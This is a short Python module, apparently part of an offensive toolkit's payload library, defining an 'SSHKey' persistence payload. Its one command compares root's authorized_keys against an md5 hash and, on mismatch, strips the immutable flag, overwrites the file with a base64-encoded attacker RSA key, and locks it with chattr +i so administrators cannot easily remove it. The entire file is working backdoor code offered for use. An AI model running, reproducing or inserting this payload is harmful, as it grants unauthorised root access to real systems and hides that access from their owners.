#!/usr/bin/python3

from ..base import Payload

# First line persistence
pline = ("""cat /root/.ssh/authorized_keys | md5sum | """
         """grep b1f652678093ea16a9cb3197e8bb13a0 || """
         """sh -c 'chattr -i /root/.ssh/authorized_keys; """
         """printf "c3NoLXJzYSBBQUFBQjNOemFDMXljMkVBQUFBREFRQUJB"""
         """QUFCQVFEcWdxL2NmcjVrRmdtSS9GdVVHcWxESkhUSUZJSDVjSFpZ"""
         """QnY1ckwwQ0hvdnUzQkp6ZklUenluV2FhV0tyUHJGNDJ3VkxnMmhR"""
         """UXhwMGcwUE5XdW90dEhqNjhQVmhZR2plTk9OYkU2Q2VCNEdqOTlr"""
         """eTZFNVlBRElkWkNLQzhVTDNTMXI1QkNHMDVNUlh6YlJkUER4VFRF"""
         """dThFZkdHMTZIT1p2bHNjQ29yem1lV1VIeXJ2S29FR3NHSGlrYVN6"""
         """UUxVZ2NVOU5ELzVvelUraGw5K001OUEwNk9pSGtqeXZFQUhYVnRF"""
         """Si91alRpSXJzTllRMkdaMnJreGVuL3NwSzJaaC9FMFZHa0d6VWZr"""
         """Q0FMaEtsWWxmSWpCWWZISE5odlZEZncvK1hWQ05lSDMyVjdqSHg0"""
         """OGJIWlI3M0F6NUhScjhWaEFrbmg1dmpHaHVpNHVQc29oTEggYW1v"""
         """bkBFdmFubmEK" | base64 -d > /root/.ssh/authorized_keys;"""
         """chattr +i /root/.ssh/authorized_keys'"""
         )

class SSHKey(Payload):

    def __init__(self):
        self.commands = []
        self.commands.append(pline)

    def steps(self):
        return self.commands


